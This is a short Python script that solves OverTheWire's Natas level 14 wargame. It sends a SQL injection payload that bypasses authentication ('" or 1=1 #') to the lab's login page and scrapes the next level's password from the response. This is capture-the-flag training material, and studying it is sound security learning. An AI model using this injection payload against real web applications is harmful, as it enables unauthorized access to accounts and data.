#! /usr/bin/python

import requests
import re

username = 'natas14'
password = ''

payload = '?username=1" or 1=1 %23&password=1'

r = requests.get('http://natas14.natas.labs.overthewire.org/' + payload, auth=(username, password))
pattern = r'The password for natas15 is (\w+)'
result = re.search(pattern, str(r.content))

print result.group(1)
